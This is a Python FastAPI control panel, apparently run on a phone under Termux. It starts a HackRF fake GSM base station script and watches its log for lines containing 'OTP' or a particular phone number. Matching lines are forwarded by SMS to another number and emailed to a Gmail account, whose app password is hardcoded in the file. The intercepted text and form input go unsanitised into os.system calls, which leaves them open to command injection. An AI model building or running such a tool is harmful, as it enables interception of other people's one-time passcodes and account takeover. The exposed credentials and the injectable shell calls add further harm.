from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse, JSONResponse
import os
import smtplib
from email.mime.text import MIMEText
from threading import Thread
import time

app = FastAPI()

# ✅ Your Email Config
EMAIL_SENDER = "anewtrends9@gmail.com"
EMAIL_PASSWORD = "lxgd jiyh ppie atzq"
EMAIL_RECEIVER = "anewtrends9@gmail.com"

# ✅ Send Email Function
def send_email(subject: str, body: str):
    msg = MIMEText(body)
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg['Subject'] = subject
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[EMAIL] ✅ Sent successfully")
    except Exception as e:
        print(f"[EMAIL] ❌ Error: {e}")

# ✅ BTS Log Watcher
def watch_bts_log():
    log_file = "/data/data/com.termux/files/home/touch_not/bts.log"
    if not os.path.exists(log_file):
        open(log_file, "w").close()
    with open(log_file, "r") as f:
        f.seek(0, 2)  # Go to end of file
        while True:
            line = f.readline()
            if not line:
                time.sleep(1)
                continue
            if "+2349099199440" in line or "OTP" in line:
                message = line.strip()
                print(f"[BTS] Intercepted: {message}")
                os.system(f'termux-sms-send -n +2347039630505 "{message}"')
                send_email("📩 Intercepted Message from Lost SIM", message)

@app.on_event("startup")
def start_log_thread():
    Thread(target=watch_bts_log, daemon=True).start()

# ✅ Home Page with UI Buttons
@app.get("/", response_class=HTMLResponse)
async def home():
    html = """
    <html>
    <head>
        <title>Touch Not</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 30px; text-align: center; }
            button { padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; }
            input { padding: 8px; width: 300px; margin-top: 10px; }
            .log { margin-top: 20px; color: #444; font-size: 14px; }
        </style>
        <script>
            async function callAPI(endpoint) {
                const res = await fetch(endpoint);
                const data = await res.json();
                document.getElementById('log').innerText = JSON.stringify(data, null, 2);
            }
            async function forwardMessage() {
                const msg = document.getElementById('msg').value;
                if (!msg) {
                    alert("Please enter a message.");
                    return;
                }
                const formData = new FormData();
                formData.append("message", msg);
                formData.append("number", "+2347039630505");
                const res = await fetch("/api/forward", { method: "POST", body: formData });
                const data = await res.json();
                document.getElementById('log').innerText = JSON.stringify(data, null, 2);
                document.getElementById('msg').value = "";
            }
        </script>
    </head>
    <body>
        <h1>📡 Touch Not Control Panel</h1>
        <button onclick="callAPI('/api/start_bts')">🟢 Start BTS</button>
        <button onclick="callAPI('/api/stop_bts')">🔴 Stop BTS</button><br><br>
        <input id="msg" placeholder="Enter message to forward"/><br>
        <button onclick="forwardMessage()">📤 Forward Message</button>
        <pre class="log" id="log"></pre>
    </body>
    </html>
    """
    return HTMLResponse(content=html)

# ✅ Info Route
@app.get("/api/info")
async def info():
    return JSONResponse({
        "status": "ok",
        "forwarding_to": "+2347039630505",
        "email_notify": EMAIL_RECEIVER
    })

# ✅ Start BTS Route
@app.get("/api/start_bts")
async def start_bts():
    os.system("bash start_hackrf_bts.sh &")
    return {"status": "started", "message": "HackRF BTS started"}

# ✅ Stop BTS Route
@app.get("/api/stop_bts")
async def stop_bts():
    os.system("pkill -f grgsm_livemon")
    return {"status": "stopped", "message": "HackRF BTS stopped"}

# ✅ Manual Forward Route
@app.post("/api/forward")
async def forward_sms(
    message: str = Form(...),
    number: str = Form("+2347039630505")
):
    os.system(f'termux-sms-send -n {number} "{message}"')
    send_email("📤 Manual Forwarded Message", f"To: {number}\n\n{message}")
    return {"status": "forwarded", "to": number, "email": EMAIL_RECEIVER}
